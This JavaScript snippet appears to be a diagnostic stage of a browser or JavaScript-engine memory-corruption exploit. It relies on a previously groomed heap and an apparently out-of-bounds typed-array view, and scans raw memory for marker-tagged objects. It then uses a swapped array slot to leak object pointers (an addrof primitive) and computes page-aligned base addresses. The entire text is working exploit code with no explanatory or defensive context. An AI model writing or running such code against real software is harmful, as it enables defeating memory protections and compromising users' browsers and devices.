// Diagnose the rooted 0x6b marker scan without allocating more objects.
// Each mutation and JSArray assignment is restored before reporting.
var result,phase="preflight";
var state=window.__fw14ArrayState;
try {
  if(!state||!state.view||!state.array||!state.a||
     state.array[0]!==state.a||!Number.isInteger(state.index)||
     !state.groomBatches||state.groomBatches.length<1)
    throw new Error("groom_state_missing");
  var view=state.view,batches=state.groomBatches;
  var candidates=0,live=0,wordRead=0,safeBase=0,aligned=0;
  var samples=[],scanEnd=Math.min(4194304,view.length-4);
  phase="scan";
  for(var i=0;i<scanEnd;i++){
    if((i&0xfffff)===0&&api&&typeof api.markSync==="function")
      api.markSync("anchor_diag_"+(i>>>20));
    if(view[i+3]!==0x6b||view[i+2]!==0)continue;
    var raw=view[i]+view[i+1]*256;
    var b=raw>>>13,local=raw&0x1fff;
    if(b>=batches.length||local>=batches[b].length)continue;
    candidates++;
    var object=batches[b][local],original=object.marker;
    if(original!==0x6b000000+raw)continue;
    var changed=false;
    try{
      object.marker=0x55667788;
      changed=view[i]===0x88&&view[i+1]===0x77&&
        view[i+2]===0x66&&view[i+3]===0x55;
    }finally{object.marker=original;}
    if(!changed)continue;
    live++;
    var word="0x";
    try{
      state.array[0]=object;
      for(var w=7;w>=0;w--)
        word+=view[state.index+w].toString(16).padStart(2,"0");
    }finally{state.array[0]=state.a;}
    var address=Number(word),base=address+8-i;
    if(Number.isSafeInteger(address))wordRead++;
    if(Number.isSafeInteger(base)&&base>0)safeBase++;
    if(Number.isSafeInteger(base)&&base>0&&base%4096===0)aligned++;
    if(samples.length<8)
      samples.push(i.toString(16)+":b"+b+"/"+local+":"+word+
        ":"+(Number.isSafeInteger(base)?"0x"+base.toString(16):"unsafe")+
        ":m"+(Number.isSafeInteger(base)?base%4096:-1));
    if(live>=128)break;
  }
  result={id:"anchor_diagnose_v1",status:state.array[0]===state.a?"pass":"fail",
    details:{batches:batches.length,candidates:candidates,live:live,
      word_read:wordRead,safe_base:safeBase,aligned:aligned,
      samples:samples.join(" | ").slice(0,1000),scan_end:scanEnd,
      array_restored:state.array[0]===state.a}};
}catch(error){
  result={id:"anchor_diagnose_v1",status:"error",
    details:{phase:phase,error:String(error).slice(0,180)}};
}finally{
  if(state&&state.array&&state.a)state.array[0]=state.a;
}
return [result];
